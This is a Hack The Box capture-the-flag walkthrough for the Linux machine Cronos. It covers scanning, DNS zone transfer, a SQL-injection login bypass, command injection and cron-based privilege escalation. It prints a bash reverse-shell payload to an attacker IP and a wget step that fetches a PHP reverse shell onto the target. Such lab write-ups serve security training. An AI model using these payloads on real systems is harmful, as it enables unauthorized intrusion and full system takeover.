# Cronos

**OS:** Linux

**Level:** Medium

**Links:** [1](https://www.hackthebox.com/machines/cronos)  [2](https://app.hackthebox.com/machines/Cronos)

**Machine ip:** 10.10.10.13

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/197dcde6-c564-41a2-83c6-17d2fc0e5895)


# Sections
+ [Enumeration](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/07_Cronos.md#enumeration)
+ [Gainin Access](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/07_Cronos.md#gainin-access)
+ [Privilege Escalation](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/07_Cronos.md#privilege-escalation)
+ [Links](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/07_Cronos.md#links)


## Enumeration
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.13 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.13`
+ `sudo nmap -Pn -sV -sC -sU -p$ports 10.10.10.13`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/91f25735-459a-4a75-a798-2c419bd4a7c1)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e7764b71-bd50-4af5-ab88-80b1f69cbd8b)

+ dns enumeration: `nslookup`
```
└─$ nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8878f5ed-c712-45c6-aa14-0b093ff5139c)

+ dns enumeration: `nslookup host [server]`
+ `nslookup 10.10.10.13 10.10.10.13`
```
└─$ nslookup 10.10.10.13 10.10.10.13
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/08c7ad57-ee86-4e75-8e75-e12dd33f9c64)

+ Zone transfer: `host -l <domain-name> <dns_server-address>`
+ `host -l cronos.htb 10.10.10.13`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/85af127e-788f-4388-960a-f43543698b49)


+ Zoner transfer: `dig axfr @10.10.10.13 cronos.htb`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ac1ace97-a6ec-4bb8-958d-5d740aaf4e59)

+ `dig any @10.10.10.13 cronos.htb`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cc415b9e-da19-489d-a4b8-8ca809bf085b)

+ Add domains into `/etc/hosts` file
```
echo "10.10.10.13 cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb" >> /etc/hosts
```

+ Enumerate subdomain:
```
gobuster dns -d cronos.htb -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/443694fe-6171-479f-8ff4-92d5bc986ca1)

+ Navigate to `http://admin.cronos.htb/`
+ Login bypass injecting `admin' or '`:`pass`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9bcf5f5e-d294-4d8c-94c1-e7b104bbd065)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4e8644a6-27b4-4344-89e3-1212103589d8)

+ Use `;` to inject command, and that works.

## Gainin Access

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5933aa22-258b-4e2a-a2ec-dd75145e7892)

+ Start a netcat listener: `nc -lnvp 4444`
+ Inject reverse payload after `;`  `/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1"` and execute.
+ Get shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/765ae797-f4f3-4efc-8602-2587e6aeba6a)


## Privilege Escalation

+ Check cronjobs: `cat /etc/crontab` on the target.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2f5fd4a0-4895-4cbb-bc40-6ef8ece43146)

+ `cp /usr/share/webshells/php/php-reverse-shell.php shell.php` on your attack machine.
+ Change ip address and port number.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b08c2273-d780-4622-9ed4-f50cd8f50d9b)

+ Start `python3 -m http.server` on the attack machine.

+ Transfer to the target.
+ `cd /var/www/laravel/` on the target.
+ `wget 10.10.14.18:8000/shell.php -O artisan` on the target.
+ `chmod +x artisan` on the target.

+ Start listener: `nc -lnvp 5555` on your attack machine.
+ Get root shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bca0fd82-2a1b-4293-bbe0-8f697cba3cdd)

---

# Links

# References & Alternatives
+ https://vvmlist.github.io/#cronos
+ https://0xdf.gitlab.io/2020/04/14/htb-cronos.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/cronos-writeup-w-o-metasploit
+ https://benheater.com/hackthebox-cronos/
+ https://alessandrocristofanilli.xyz/posts/htb-cronos/
+ https://systemweakness.com/htb-cronos-walkthrough-3f669386b681
+ https://dev.to/sshad0w/hack-the-box-writeup-cronos-21bn
+ https://www.noobsec.net/hackthebox/htb-cronos/
+ https://medium.com/cronos-htb-walkthough/cronos-htb-walkthrough-9ef91750726
+ https://sevenlayers.com/index.php/133-hackthebox-cronos-walkthrough
